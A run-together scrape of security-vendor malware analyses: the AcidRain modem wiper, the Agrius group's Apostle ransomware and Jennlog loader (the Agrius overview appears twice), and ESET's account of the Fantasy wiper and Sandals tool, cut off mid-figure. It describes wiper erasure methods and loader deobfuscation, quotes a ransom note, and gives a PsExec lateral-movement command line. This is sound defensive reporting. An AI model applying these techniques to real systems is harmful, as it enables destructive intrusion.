While the threat remains focused on Southeast Asia, tactics like this can be applied to various places across the world. It is better to stay ahead of the curve to ensure your safety against these malicious actors. Ensuring your systems are protected on all aspects is integral to the productivity of your enterprise. Trend Micro Vision One can help you prevent threats like this with multiple security layers across all platforms, and its intuitive threat detection, investigation and response system makes it a key factor to stop Earth Zhulong’s evolving methods of infiltrating systems.By Juan Andres Guerrero-Saade ( @juanandres_gs ) and Max van Amerongen ( @maxpl0it )
Executive Summary
On Thursday, February 24th, 2022, a cyber attack rendered Viasat KA-SAT modems inoperable in Ukraine.
Spillover from this attack rendered 5,800 Enercon wind turbines in Germany unable to communicate for remote monitoring or control.
Viasat’s statement on Wednesday, March 30th, 2022 provides a somewhat plausible but incomplete description of the attack.
SentinelLabs researchers discovered new malware that we named ‘AcidRain’.
AcidRain is an ELF MIPS malware designed to wipe modems and routers.
We assess with medium-confidence that there are developmental similarities between AcidRain and a VPNFilter stage 3 destructive plugin. In 2018, the FBI and Department of Justice attributed the VPNFilter campaign to the Russian government
AcidRain is the 7th wiper malware associated with the Russian invasion of Ukraine.
Context
The Russian invasion of Ukraine has included a wealth of cyber operations that have tested our collective assumptions about the role that cyber plays in modern warfare. Some commentators have voiced a bizarre disappointment at the ‘lack of cyber’ while those at the coalface are overwhelmed by the abundance of cyber operations accompanying conventional warfare. From the beginning of 2022, we have dealt with six different strains of wiper malware targeting Ukraine: WhisperKill, WhisperGate, HermeticWiper , IsaacWiper, CaddyWiper, and DoubleZero. These attacks are notable on their own. But there’s been an elephant in the room by way of the rumored ‘satellite modem hack’. This particular attack goes beyond Ukraine.
We first became aware of an issue with Viasat KA-SAT routers due to a reported outage of 5,800 Enercon wind turbines in Germany . To clarify, the wind turbines themselves were not rendered inoperable but “remote monitoring and control of the wind turbines” became unavailable due to issues with satellite communications. The timing coincided with the Russian invasion of Ukraine and suspicions arose that an attempt to take out Ukrainian military command-and-control capabilities by hindering satellite connectivity spilled over to affect German critical infrastructure. No technical details became available; technical speculation has been rampant.
On Wednesday, March 30th, 2022, Viasat finally released a statement stating that the attack took place in two phases: First, a denial of service attack coming from “several SurfBeam2 and SurfBeam2+ modems and […other on-prem equipment…] physically located within Ukraine” that temporarily knocked KA-SAT modems offline. Then, the gradual disappearance of modems from the Viasat service. The actual service provider is in the midst of a complex arrangement where Eutalsat provides the service, but it’s administered by an Italian company called Skylogic as part of a transition plan.
The Viasat Explanation
At the time of writing, Viasat has not provided any technical indicators nor an incident response report. They did provide a general sense of the attack chain with conclusions that are difficult to reconcile.
Viasat reports that the attackers exploited a misconfigured VPN appliance, gained access to the trust management segment of the KA-SAT network, moved laterally, then used their access to “execute legitimate, targeted management commands on a large number of residential modems simultaneously”. Viasat goes on to add that “these destructive commands overwrote key data in flash memory on the modems , rendering the modems unable to access the network, but not permanently unusable ”.
It remains unclear how legitimate commands could have such a disruptive effect on the modems. Scalable disruption is more plausibly achieved by pushing an update, script, or executable. It’s also hard to envision how legitimate commands would enable either the DoS effects or render the devices unusable but not permanently bricked.
In effect, the preliminary Viasat incident report posits the following requirements:
Could be pushed via the KA-SAT management segment onto modems en masse
Would overwrite key data in the modem’s flash memory
Render the devices unusable, in need of a factory reset or replacement but not permanently unusable.
With those requirements in mind, we postulate an alternative hypothesis: The threat actor used the KA-SAT management mechanism in a supply-chain attack to push a wiper designed for modems and routers. A wiper for this kind of device would overwrite key data in the modem’s flash memory, rendering it inoperable and in need of reflashing or replacing.
The AcidRain Wiper
On Tuesday, March 15th, 2022, a suspicious upload caught our attention. A MIPS ELF binary was uploaded to VirusTotal from Italy with the name ‘ukrop’. We didn’t know how to parse the name accurately. Possible interpretations include a shorthand for “ukr”aine “op”eration, the acronym for the Ukrainian Association of Patriots, or a Russian ethnic slur for Ukrainians – ‘ Укроп ’. Only the incident responders in the Viasat case could say definitively whether this was in fact the malware used in this particular incident. We posit its use as a fitting hypothesis and will describe its functionality, quirky development traits, and possible overlaps with previous Russian operations in need of further research.
Technical Overview
SHA256
9b4dfaca873961174ba935fddaf696145afe7bbf5734509f95feb54f3584fd9a
Magic
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped
AcidRain’s functionality is relatively straightforward and takes a bruteforce attempt that possibly signifies that the attackers were either unfamiliar with the particulars of the target firmware or wanted the tool to remain generic and reusable. The binary performs an in-depth wipe of the filesystem and various known storage device files. If the code is running as root, AcidRain performs an initial recursive overwrite and delete of non-standard files in the filesystem.
Recursively delete files in nonstandard folders
Following this, it attempts to destroy the data in the following storage device files:
Targeted Device(s)
Description
This wiper iterates over all possible device file identifiers (e.g., mtdblock0 – mtdblock99), opens the device file, and either overwrites it with up to 0x40000 bytes of data or (in the case of the /dev/mtd* device file) uses the following IOCTLS to erase it: MEMGETINFO, MEMUNLOCK, MEMERASE, and MEMWRITEOOB. In order to make sure that these writes have been committed, the developers run an syscall. fsync
The code that generates the malicious data used to overwrite storage
When the overwriting method is used instead of the IOCTLs, it copies from a memory region initialized as an array of 4-byte integers starting at and decrementing at each index. This matches what others had seen after the exploit had taken place. 0xffffffff
Side-by-side comparison of a Surfbeam2 modem pre- and post-attack
The code for both erasure methods can be seen below:
Mechanisms to erase devices: write 0x40000 (left) or use MEM* IOCTLS (right)
Once the various wiping processes are complete, the device is rebooted.
Redundant attempts to reboot the device
This results in the device being rendered inoperable.
An Interesting Oddity
Despite what the Ukraine invasion has taught us, wiper malware is relatively rare. More so wiper malware aimed at routers, modems, or IoT devices. The most notable case is VPNFilter, a modular malware aimed at SOHO routers and QNAP storage devices, discovered by Talos . This was followed by an FBI indictment attributing the operation to Russia (APT28, in particular). More recently, the NSA and CISA attributed VPNFilter to Sandworm (a different threat actor attributed to the same organization, the Russian GRU) as the U.K.’s National Cyber Security Centre (NCSC) described VPNFilter’s successor, Cyclops Blink .
VPNFilter included an impressive array of functionality in the form of multi-stage plugins selectively deployed to the infected devices. The functionality ranges from credential theft to monitoring Modbus SCADA protocols. Among its many plugins, it also included functionality to wipe and brick devices as well as DDoS a target .
The reason we bring up the specter of VPNFilter is not because of its superficial similarities to AcidRain but rather because of an interesting (but inconclusive) code overlap between a specific VPNFilter plugin and AcidRain.
VPNFilter Stage 3 Plugin – ‘dstr’
SHA256
47f521bd6be19f823bfd3a72d851d6f3440a6c4cc3d940190bdc9b6dd53a83d6
Magic
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped
After the initial discovery of VPNFilter, additional plugins were revealed by researchers attempting to understand the massive spread of the botnet and its many intricacies. Among these were previously unknown plugins, including ‘dstr’. As the mangled name suggests, it’s a ‘destruction’ module meant to supplement stage 2 plugins that lacked the ‘kill’ command meant to wipe the devices.
This plugin was brought to our attention initially by tlsh fuzzy hashing , a more recent matching library that’s proven far more effective than ssdeep or imphash in identifying similar samples. The similarity was at 55% to AcidRain with no other samples being flagged in the VT corpus. This alone is not nearly enough to conclusively judge the two samples as tied, but it did warrant further investigation.
VPNFilter and AcidRain are both notably similar and dissimilar. They’re both MIPS ELF binaries and the bulk of their shared code appears to stem from statically-linked libc . It appears that they may also share a compiler, most clearly evidenced by the identical Section Headers Strings Tables.
Section Headers Strings Tables for VPNFilter and AcidRain
And there are other development quirks, such as the storing of the previous syscall number to a global location before a new syscall . At this time, we can’t judge whether this is a shared compiler optimization or a strange developer quirk.
More notably, while VPNFilter and AcidRain work in very different ways, both binaries make use of the MEMGETINFO, MEMUNLOCK, and MEMERASE IOCTLS to erase mtd device files.
On the left, AcidRain; on the right, VPNFilter
There are also notable differences between VPNFilter’s ‘dstr’ plugin and AcidRain. The latter appears to be a far sloppier product that doesn’t consistently rise to the coding standards of the former. For example, note the redundant use of process forking and needless repetition of operations.
They also appear to serve different purposes, with the VPNFilter plugin targeting specific devices with hardcoded paths, and AcidRain taking more of a “one-binary-fits-all” approach to wiping devices. By brute forcing device filenames, the attackers can more readily reuse AcidRain against more diverse targets.
We invite the research community to stress test this developmental overlap and contribute their own findings.
Conclusions
As we consider what’s possibly the most important cyber attack in the ongoing Russian invasion of Ukraine, there are many open questions. Despite Viasat’s statement claiming that there was no supply-chain attack or use of malicious code on the affected routers, we posit the more plausible hypothesis that the attackers deployed AcidRain (and perhaps other binaries and scripts) to these devices in order to conduct their operation.
While we cannot definitively tie AcidRain to VPNFilter (or the larger Sandworm threat cluster), we note a medium-confidence assessment of non-trivial developmental similarities between their components and hope the research community will continue to contribute their findings in the spirit of collaboration that has permeated the threat intelligence industry over the past month.
References
https://www.wired.com/story/viasat-internet-hack-ukraine-russia/
https://www.cisa.gov/uscert/ncas/alerts/aa22-076a
https://media.defense.gov/2022/Jan/25/2002927101/-1/-1/0/CSA_PROTECTING_VSAT_COMMUNICATIONS_01252022.PDF
https://www.airforcemag.com/hackers-attacked-satellite-terminals-through-management-network-viasat-officials-say/
https://nps.edu/documents/104517539/104522593/RELIEF12-4_QLR.pdf/9cc03d09-9af4-410e-b601-a8bffdae0c30
https://www.reuters.com/business/media-telecom/exclusive-hackers-who-crippled-viasat-modems-ukraine-are-still-active-company-2022-03-30/
https://www.viasat.com/about/newsroom/blog/ka-sat-network-cyber-attack-overview/
https://blog.talosintelligence.com/2018/05/VPNFilter.html
https://blog.talosintelligence.com/2018/06/vpnfilter-update.html?m=1
https://blog.talosintelligence.com/2018/09/vpnfilter-part-3.html
https://www.ncsc.gov.uk/files/Cyclops-Blink-Malware-Analysis-Report.pdf
https://www.trendmicro.com/en_us/research/21/a/vpnfilter-two-years-later-routers-still-compromised-.htmlA new threat actor SentinelLabs tracks as Agrius was observed operating in Israel starting in 2020.
Initially engaged in espionage activity, Agrius deployed a set of destructive wiper attacks against Israeli targets, masquerading the activity as ransomware attacks.
The attacks were carried out using DEADWOOD ( aka Detbosit), a wiper with unconfirmed links to an Iranian threat group.
Agrius actors also dropped a novel wiper named ‘Apostle’ and a custom .NET backdoor called ‘IPsec Helper’.
Later intrusions carried out by Agrius revealed they kept maintaining and improving Apostle , turning it into a fully functional ransomware.
Agrius Overview
A new threat actor SentinelLabs track as Agrius was observed operating in Israel beginning in 2020. An analysis of what at first sight appeared to be a ransomware attack revealed new variants of wipers that were deployed in a set of destructive attacks against Israeli targets. The operators behind the attacks intentionally masked their activity as ransomware attacks.
One of the wipers used in the attack, dubbed ‘ Apostle’ , was later turned into a fully functional ransomware, replacing its wiper functionalities. The message inside it suggests it was used to target a critical, nation-owned facility in the United Arab Emirates. The similarity to its wiper version, as well as the nature of the target in the context of regional disputes, leads us to believe that the operators behind it are utilizing ransomware for its disruptive capabilities.
The usage of ransomware as a disruptive tool is usually hard to prove, as it is difficult to determine a threat actor’s intentions. Analysis of the Apostle malware provides a rare insight into such attacks, drawing a clear line between what began as a wiper malware to a fully operational ransomware.
Based on technical analysis of the tools and attack infrastructure, we assess with medium confidence that the attacks were carried out by a threat group affiliated with Iran. While some links to known Iranian actors were observed, the set of TTPs and tools appear to be unique to this set of activities. SentinelLabs tracks this threat actor as Agrius.
Agrius Attack Life Cycle
The Agrius threat group utilizes VPN services (primarily ProtonVPN) for anonymization when accessing the public facing applications of its targets. Upon successful exploitation, the threat actor deploys webshells or simply accesses the target by using the target organization’s VPN solution. The webshells Agrius deploys are mostly variations of ASPXSpy .
Agrius uses those webshells to tunnel RDP traffic in order to leverage compromised accounts to move laterally. During this phase, the attackers use a variety of publicly available offensive security tools for credential harvesting and lateral movement.
A summary of Agrius attack life cycle
On interesting hosts, the threat actor deploys its own custom malware – ‘ IPsec Helper ’. This backdoor is written in .NET and appears exclusive to Agrius. The malware registers itself as a service to achieve persistence. It can be used to exfiltrate data or deploy additional malware.
Agrius has deployed two different wipers. The first, dubbed ‘Apostle’, appears to be written by the same developer as ‘ IPsec Helper ’. Both are written in .NET, share functions, and execute tasks in a similar manner. Interestingly, Apostle was later modified into functioning ransomware. The second wiper, DEADWOOD, was previously involved in a wiping attack in the Middle East and tentatively attributed to Iran.
Attribution
Throughout our analysis of Agrius techniques, tools, and infrastructure, we found no solid links to any known threat groups. While it is hard to provide a definitive attribution for Agrius, a set of indications pointing the activity towards an Iranian nexus came up throughout the investigation:
Correlation with Iranian interests and past actions
While this is not a strong link, it is worth noting when correlated with other, technical links. Iranian threat actors have a long history of deploying wipers, dating back to 2012, when Iranian hackers deployed the notorious Shamoon malware against Saudi Aramco. Since then, Iranian threat actors have been caught deploying wiper malware in correlation with the regime’s interests on several occasions.
Webshells VirusTotal submissions
Some of the webshells deployed by Agrius throughout its intrusions were modified versions of ASPXSpy, deploying additional obfuscation and changing variable names. Three of the variants of this webshell were uploaded from Iran, the rest from other countries within the Middle East region.
While VirusTotal submissions are not an exact form of determining where a sample was deployed, the sources reinforce a Middle East regional focus.
Modified Agrius webshells uploaded from Iran (source: VirusTotal )
Infrastructure links to Iran
The threat actor often used public VPN providers, such as ProtonVPN. On instances where the access was performed from non-VPN nodes, it originated from servers that have also resolved to Iranian domains in the past.
Agrius infrastructure resolving to Iranian domains (source: PassiveTotal )
The usage of the DEADWOOD wiper
Agrius utilized the DEADWOOD wiper, which was previously attributed to an Iranian-nexus actor. We cannot independently corroborate previous clustering claims. The ties between Agrius and the threat actor who originally deployed DEADWOOD remain unclear. It’s possible that the two groups have access to shared resources.
Conclusion
Agrius is a new threat group that we assess with medium confidence to be of Iranian origin, engaged in both espionage and disruptive activity. The group leverages its own custom toolset, as well as publicly available offensive security tools, to target a variety of organizations in the Middle East. In some cases, the group leveraged its access to deploy destructive wiper malware, and in others a custom ransomware. Considering this, we find it unlikely that Agrius is a financially motivated threat actor.
Our analysis of Agrius activity does not come in a vacuum. Early May 2021 saw another set of disruptive ransomware attacks attributed to Iran targeting Israel from the n3tw0rm ransomware group, a newly-identified threat actor with links to the 2020 Pay2Key attacks. The close proximity of the Agrius and n3tw0rm campaigns suggest they may be part of a larger, coordinated Iranian strategy. Leaks from Lab Dookhtegan and the Project Signal ransomware operation also support this claim.
While being disruptive and effective, ransomware activities provide deniability, allowing states to send a message without taking direct blame. Similar strategies have been used with devastating effect by other nation-state sponsored actors. The most prominent of those was NotPetya in 2017, a destructive malware targeting Ukraine masked as ransomware and attributed to Russian state-sponsored threat actors by Western intelligence agencies.
Read the Full Report
See the report for the full list of IOCs and further details on Agrius.A new threat actor SentinelLabs tracks as Agrius was observed operating in Israel starting in 2020.
Initially engaged in espionage activity, Agrius deployed a set of destructive wiper attacks against Israeli targets, masquerading the activity as ransomware attacks.
The attacks were carried out using DEADWOOD ( aka Detbosit), a wiper with unconfirmed links to an Iranian threat group.
Agrius actors also dropped a novel wiper named ‘Apostle’ and a custom .NET backdoor called ‘IPsec Helper’.
Later intrusions carried out by Agrius revealed they kept maintaining and improving Apostle , turning it into a fully functional ransomware.
Agrius Overview
A new threat actor SentinelLabs track as Agrius was observed operating in Israel beginning in 2020. An analysis of what at first sight appeared to be a ransomware attack revealed new variants of wipers that were deployed in a set of destructive attacks against Israeli targets. The operators behind the attacks intentionally masked their activity as ransomware attacks.
One of the wipers used in the attack, dubbed ‘ Apostle’ , was later turned into a fully functional ransomware, replacing its wiper functionalities. The message inside it suggests it was used to target a critical, nation-owned facility in the United Arab Emirates. The similarity to its wiper version, as well as the nature of the target in the context of regional disputes, leads us to believe that the operators behind it are utilizing ransomware for its disruptive capabilities.
The usage of ransomware as a disruptive tool is usually hard to prove, as it is difficult to determine a threat actor’s intentions. Analysis of the Apostle malware provides a rare insight into such attacks, drawing a clear line between what began as a wiper malware to a fully operational ransomware.
Based on technical analysis of the tools and attack infrastructure, we assess with medium confidence that the attacks were carried out by a threat group affiliated with Iran. While some links to known Iranian actors were observed, the set of TTPs and tools appear to be unique to this set of activities. SentinelLabs tracks this threat actor as Agrius.
Agrius Attack Life Cycle
The Agrius threat group utilizes VPN services (primarily ProtonVPN) for anonymization when accessing the public facing applications of its targets. Upon successful exploitation, the threat actor deploys webshells or simply accesses the target by using the target organization’s VPN solution. The webshells Agrius deploys are mostly variations of ASPXSpy .
Agrius uses those webshells to tunnel RDP traffic in order to leverage compromised accounts to move laterally. During this phase, the attackers use a variety of publicly available offensive security tools for credential harvesting and lateral movement.
A summary of Agrius attack life cycle
On interesting hosts, the threat actor deploys its own custom malware – ‘ IPsec Helper ’. This backdoor is written in .NET and appears exclusive to Agrius. The malware registers itself as a service to achieve persistence. It can be used to exfiltrate data or deploy additional malware.
Agrius has deployed two different wipers. The first, dubbed ‘Apostle’, appears to be written by the same developer as ‘ IPsec Helper ’. Both are written in .NET, share functions, and execute tasks in a similar manner. Interestingly, Apostle was later modified into functioning ransomware. The second wiper, DEADWOOD, was previously involved in a wiping attack in the Middle East and tentatively attributed to Iran.
Attribution
Throughout our analysis of Agrius techniques, tools, and infrastructure, we found no solid links to any known threat groups. While it is hard to provide a definitive attribution for Agrius, a set of indications pointing the activity towards an Iranian nexus came up throughout the investigation:
Correlation with Iranian interests and past actions
While this is not a strong link, it is worth noting when correlated with other, technical links. Iranian threat actors have a long history of deploying wipers, dating back to 2012, when Iranian hackers deployed the notorious Shamoon malware against Saudi Aramco. Since then, Iranian threat actors have been caught deploying wiper malware in correlation with the regime’s interests on several occasions.
Webshells VirusTotal submissions
Some of the webshells deployed by Agrius throughout its intrusions were modified versions of ASPXSpy, deploying additional obfuscation and changing variable names. Three of the variants of this webshell were uploaded from Iran, the rest from other countries within the Middle East region.
While VirusTotal submissions are not an exact form of determining where a sample was deployed, the sources reinforce a Middle East regional focus.
Modified Agrius webshells uploaded from Iran (source: VirusTotal )
Infrastructure links to Iran
The threat actor often used public VPN providers, such as ProtonVPN. On instances where the access was performed from non-VPN nodes, it originated from servers that have also resolved to Iranian domains in the past.
Agrius infrastructure resolving to Iranian domains (source: PassiveTotal )
The usage of the DEADWOOD wiper
Agrius utilized the DEADWOOD wiper, which was previously attributed to an Iranian-nexus actor. We cannot independently corroborate previous clustering claims. The ties between Agrius and the threat actor who originally deployed DEADWOOD remain unclear. It’s possible that the two groups have access to shared resources.
Conclusion
Agrius is a new threat group that we assess with medium confidence to be of Iranian origin, engaged in both espionage and disruptive activity. The group leverages its own custom toolset, as well as publicly available offensive security tools, to target a variety of organizations in the Middle East. In some cases, the group leveraged its access to deploy destructive wiper malware, and in others a custom ransomware. Considering this, we find it unlikely that Agrius is a financially motivated threat actor.
Our analysis of Agrius activity does not come in a vacuum. Early May 2021 saw another set of disruptive ransomware attacks attributed to Iran targeting Israel from the n3tw0rm ransomware group, a newly-identified threat actor with links to the 2020 Pay2Key attacks. The close proximity of the Agrius and n3tw0rm campaigns suggest they may be part of a larger, coordinated Iranian strategy. Leaks from Lab Dookhtegan and the Project Signal ransomware operation also support this claim.
While being disruptive and effective, ransomware activities provide deniability, allowing states to send a message without taking direct blame. Similar strategies have been used with devastating effect by other nation-state sponsored actors. The most prominent of those was NotPetya in 2017, a destructive malware targeting Ukraine masked as ransomware and attributed to Russian state-sponsored threat actors by Western intelligence agencies.
Read the Full Report
See the report for the full list of IOCs and further details on Agrius.SentinelLabs has been tracking the activity of Agrius, a suspected Iranian threat actor operating in the Middle East, throughout 2020 and 2021 following a set of destructive attacks starting December 2020. Since we last reported on this threat actor in May 2020, Agrius lowered its profile and was not observed conducting destructive activity. This changed recently as the threat actor likely initiated a ransomware attack on the Israeli university Bar-Ilan utilizing the group’s custom Apostle ransomware.
Although the full technical details of the incident were not disclosed publicly, some information was released to the public, most notably the ransom demand text file dropped on victim machines. The .txt file matches that from a new version of Apostle compiled on August 15, 2021, the day of the attack.
The new version of Apostle is obfuscated, encrypted and compressed as a resource in a loader we call Jennlog, as it attempts to masquerade payload in resources as log files. Before executing the Apostle payload, Jennlog runs a set of tests to verify that it is not being executed in an analysis environment based on an embedded configuration. Following the analysis of the Jennlog loader, SentinelLabs retrieved an additional variant of Jennlog, used to load and run OrcusRAT.
Jennlog Analysis
Jennlog ( 5e5e526a69490399494dcd7195bb6c67 ) is a .NET loader that deobfuscates, decompresses and decrypts a .NET executable from a resource embedded within the file. The resources within the loader appear to look like log files, and it contains both the binary to run as well as a configuration for the malware’s execution.
Jennlog attempts to extract two different resources:
helloworld.pr.txt – stores Apostle payload and the configuration.
helloworld.Certificate.txt – contains None. If configured to do so, the malware compares the MD5 value of the system information (used as system fingerprint) to the contents of this resource.
The payload hidden in “ helloworld.pr.txt ” appears to look like a log file at first sight:
Contents of “ helloworld.pr.txt ” resource embedded within Jennlog
The payload is extracted from the resource by searching for a separator word – “ Jennifer ”. Splitting the contents of the resource results in an array of three strings:
Decoy string – Most likely there to make the log file look more authentic.
Configuration string – Used to determine the configuration of the malware execution.
Payload – An obfuscated, compressed and encrypted file.
Configuration
The configuration of Jennlog consists of 13 values, 12 of which are actually used in this version of the malware. In the variants we were able to retrieve, all of these flags are set to 0.
Jennlog configuration values
One of the most interesting flags found here is the certificate flag. If this flag is set, it will cause the malware to run only on a specific system. If this system does not match the configured MD5 fingerprint, the malware either stops operation or deletes itself utilizing the function ExecuteInstalledNodeAndDelete() , which creates and runs a BAT file as observed in other Agrius malware.
Jennlog ExecuteInstalledNodeAndDelete() function
Following all the configuration based-checks, Jennlog continues to unpack the main binary from within the resource “ helloworld.pr.txt ” by performing the following string manipulations in the function EditString() on the obfuscated payload:
Replace all “ \nLog ” with “ A ”.
Reverse the string.
Remove all whitespaces.
This manipulation will result in a long base64-encoded deflated content, which is inflated using the function stringCompressor.Unzip() . The inflated content highly resembles the contents of the original obfuscated payload, and it is deobfuscated again using the EditString() function.
The deobfuscation of the inflated content is carried out in a rather peculiar way, being run as a “catch” statement after attempting to turn a string containing a URL to int, which will always result in an error. The domain presented in the URL was never bought, and highly resembles other Agrius malware unpurchased domains, often used as “Super Relays”. Here, however, the domain is not actually contacted.
Execution of EditString() function as a catch statement
Following a second run of the EditString() function, Jennlog decodes the extracted content and decrypts it using an implementation of RC4 with a predefined key. The extracted content found in this sample is a new version of the Apostle ransomware, which is loaded into memory and ran using the parameters given to Jennlog at execution.
Apostle Ransomware Analysis
The new variant of Apostle ( cbdbda089f7c7840d4daed22c34969fd876315b6 ) embedded within the Jennlog loader was compiled on August 15, 2021, the day the attack on Bar-Ilan university was carried out. Its execution flow is highly similar to the variant described in previous reports, and it even checks for the same Mutex as the previous ransomware variant.
The message embedded within it, however, is quite different:
Ooops, Your files are encrypted!!! Don't worry,You can return all your files!
If you want to restore theme, Send $ 10000 worth of Monero to following address :
43 JuFUyzfcKQwTzCTHpQoA8uLGtbwFBLyeeXoYEEU5dZLhLT1cZJDk4cytjcgQT7kdjSerJqpEp2gUcH91bjLcoq2bqik3j
Then follow this Telegram ID : hxxps://t[.]me/x4ran
This is the exact same message that was released to the media in the context of the Bar-Ilan ransomware incident, as reported on ynet :
Ransom demand text file as seen in Bar-Ilan university
Other than the ransom demand note, the wallpaper picture used on affected machines was also changed, this time presenting an image of a clown:
New Apostle variant wallpaper image
OrcusRAT Jennlog Loader
An additional variant of Jennlog ( 43b810f918e357669be42030a1feb727 ) was uploaded to VirusTotal on July 14, 2021 from Iran. This variant is highly similar to the one used to load Apostle, and contains a similar configuration scheme (all set to 0). It is used to load a variant of OrcusRAT, which is extracted from the files resources in a similar manner.
The OrcusRAT variant ( add7b6b60e746c36a66f5ec233873372 ) extracted from within it was submitted to VT on June 20, 2021 using the same submitter ID from Iran. It seems to connect to an internal IP address – 192.168.178.114 , indicating it might have been used for testing. It also contained the following PDB path:
C :\ Users \ dou \ Desktop \ repo \ arcu-win \ src \ Orcus \ obj \ Debug \ Orcus .pdb
Conclusion
Agrius has shown a willingness to strategically wipe systems and has continued to evolve its toolkit to enable ransomware operations. At this time, we don’t know if the actor is committed to financially-motivated operations, but we do know the original intent was sabotage. We expect the sort of subterfuge seen here to be deployed in future Agrius operations. SentinelLabs continues to track the development of this nascent threat actor.
Technical Indicators
Jennlog Loader (Apostle Loader)
5e5e526a69490399494dcd7195bb6c67
c9428afa269bbf8c48a08a7109c553163d2051e7
0ba324337b1d76a5afc26956d4dc9f57786483230112eaead5b5c92022c089c7
Apostle – Bar-Ilan variant
fc8221382521a40ec0042431a947a3ca
cbdbda089f7c7840d4daed22c34969fd876315b6
44c13c46d4f597ea0625f1c87eecffe3cd5dcd257c5fac18a6fa931ba9b5f97a
Jennlog Loader (OrcusRAT Loader)
43b810f918e357669be42030a1feb727
3de36410a99cf3bd8e0c56fdeafa32bbf7625af1
14659857df1753f720ac797a43a9c3f3e241c3df762de7f50bbbae00feb818c9
OrcusRAT
add7b6b60e746c36a66f5ec233873372
a35bffc49871bb3a48bdd35b4a4d04d208f23487
069686119adc13e1785cb7a425611d1ec13f33ae75962a7e50e00414209d1809ESET researchers analyzed a supply-chain attack abusing an Israeli software developer to deploy Fantasy, Agrius’s new wiper, with victims including the diamond industry
ESET researchers discovered a new wiper and its execution tool, both attributed to the Agrius APT group, while analyzing a supply-chain attack abusing an Israeli software developer. The group is known for its destructive operations.
In February 2022, Agrius began targeting Israeli HR and IT consulting firms, and users of an Israeli software suite used in the diamond industry. We believe that Agrius operators conducted a supply-chain attack abusing the Israeli software developer to deploy their new wiper, Fantasy, and a new lateral movement and Fantasy execution tool, Sandals.
The Fantasy wiper is built on the foundations of the previously reported Apostle wiper but does not attempt to masquerade as ransomware, as Apostle originally did. Instead, it goes right to work wiping data. Victims were observed in South Africa – where reconnaissance began several weeks before Fantasy was deployed – Israel, and Hong Kong.
Key points of this blogpost:
Agrius conducted a supply-chain attack abusing an Israeli software suite used in the diamond industry.
The group then deployed a new wiper we named Fantasy. Most of its code base comes from Apostle, Agrius’s previous wiper.
Along with Fantasy, Agrius also deployed a new lateral movement and Fantasy execution tool that we have named Sandals.
Victims include Israeli HR firms, IT consulting companies, and a diamond wholesaler; a South African organization working in the diamond industry; and a jeweler in Hong Kong.
Group overview
Agrius is a newer Iran-aligned group targeting victims in Israel and the United Arab Emirates since 2020 . The group initially deployed a wiper, Apostle, disguised as ransomware, but later modified Apostle into fully fledged ransomware. Agrius exploits known vulnerabilities in internet-facing applications to install webshells, then conducts internal reconnaissance before moving laterally and then deploying its malicious payloads.
Campaign overview
On February 20 th , 2022 at an organization in the diamond industry in South Africa, Agrius deployed credential harvesting tools, probably in preparation for this campaign. Then, on March 12 th , 2022, Agrius launched the wiping attack by deploying Fantasy and Sandals, first to the victim in South Africa and then to victims in Israel and lastly to a victim in Hong Kong.
Victims in Israel include an IT support services company, a diamond wholesaler, and an HR consulting firm. South African victims are from a single organization in the diamond industry, with the Hong Kong victim being a jeweler.
Figure 1. Victim timeline and locations
The campaign lasted less than three hours and within that timeframe ESET customers were already protected with detections identifying Fantasy as a wiper, and blocking its execution. We observed the software developer pushing out clean updates within a matter of hours of the attack. We reached out to the software developer to notify them about a potential compromise, but our enquiries went unanswered.
Preparing for departure
The first tools deployed by Agrius operators to victim systems, through means unknown, were:
MiniDump , “ a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps ”
SecretsDump , a Python script that “ performs various techniques to dump hashes from [a] remote machine without executing any agent there ”
Host2IP, a custom C#/.NET tool that resolves a hostname to an IP address.
Usernames, passwords, and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper. Agrius operators deployed MiniDump and SecretsDump to this campaign’s first victim on February 20 th , 2022, but waited until March 12 th , 2022 to deploy Host2IP, Fantasy, and Sandals (consecutively).
Sandals: Igniting the Fantasy (wiper)
Sandals is a 32-bit Windows executable written in C#/.NET. We chose the name because Sandals is an anagram of some of the command line arguments it accepts. It is used to connect to systems in the same network via SMB, to write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string:
PsExec.exe /accepteula -d -u “<username>” -p “<password>” -s “C:\<path>\<GUID>.bat”
The PsExec options have the following meanings:
-d – Don’t wait for process to terminate (non-interactive).
/accepteula – Suppress display of the license dialog.
-s – Run the remote process in the SYSTEM account.
Sandals does not write the Fantasy wiper to remote systems. We believe that the Fantasy wiper is deployed via a supply-chain attack using the software developer’s software update mechanism. This assessment is based on several factors:
all victims were customers of the affected software developer;
the Fantasy wiper was named in a similar fashion to legitimate versions of the software;
all victims executed the Fantasy wiper within a 2.5 hour timeframe, where victims in South Africa were targeted first, then victims in Israel, and finally victims in Hong Kong (we attribute the delay in targeting to time zone differences and a hardcoded check-in time within the legitimate software); and,
lastly, the Fantasy wiper was written to, and executed from, %SYSTEM%\Windows\Temp , the default temp directory for Windows systems.
Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims’ machines, and for ease of batch file execution. Table 1 lists the command line arguments accepted by Sandals.
Table 1. Sandals arguments and their descriptions
-f <filepath> A path and filename to a file that contains a list of hostnames that should be targeted. Yes
-u <username> The username that will be used to log into the remote hostname(s) in argument -f . Yes
-p <password> The username that will be used to log into the remote hostname(s) in argument -f . Yes
-l <filepath> The path and filename of the Fantasy wiper on the remote system that will be executed by the batch file created by Sandals. Yes
-d <path> The location to which Sandals will write the batch file on the remote system. Default location is %WINDOWS%\Temp . No
-s <integer> The amount of time, in seconds, that Sandals will sleep between writing the batch file to disk and executing. The default is two seconds. No
-a random or
-a rsa If -a is followed by the word file and a path and filename, Sandals uses the encryption key in the supplied file. If -a is followed by rsa or random , Sandals uses the RSACryptoServiceProvider class to generate a public-private key pair with a key size of 2,048.
-dn <devicename> Specifies which drive to connect with on a remote system over SMB. Default is C: . No
-ps <filepath> Location of PsExec on disk. Default is psexec.exe in the current working directory. No
-ra If -ra is supplied at runtime, it sets the variable flag to True (initially set to False ). If flag=True , Sandals deletes all files written to disk in the current working directory. If flag=False , Sandals skips the file cleanup step. No
The batch file written to disk by Sandals is named <GUID>.bat , where the filename is the output of the Guid.NewGuid() method . An example of a Sandals batch file is shown in Figure 2.
Figure 2. Sandals batch file (top, in red) and the decoded command line parameter (bottom, in blue)
